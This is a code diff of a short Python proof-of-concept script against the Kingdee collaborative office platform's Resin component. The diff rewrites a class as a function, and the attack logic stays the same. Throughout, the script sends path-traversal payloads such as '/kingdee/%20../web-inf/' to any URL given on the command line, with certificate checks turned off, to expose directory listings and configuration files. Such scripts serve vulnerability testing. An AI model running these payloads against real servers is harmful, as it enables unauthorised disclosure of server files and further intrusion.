@@ -17,21 +17,14 @@ description: 金蝶协同办公系统基于resin引用了漏洞组件导致远�
 import sys
 import requests
 import warnings
-  
-
-
-class resin_dir_path_disclosure:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['金蝶协同平台远程信息泄露漏洞','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payloads = ["/kingdee/%20../web-inf/", "/kingdee/%20../editor/", "/kingdee/%20../disk/"]
         for payload in payloads:
-            vulnurl = self.url + payload
+            vulnurl = url + payload
             try:
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
 
@@ -47,5 +40,5 @@ class resin_dir_path_disclosure:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = resin_dir_path_disclosure(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
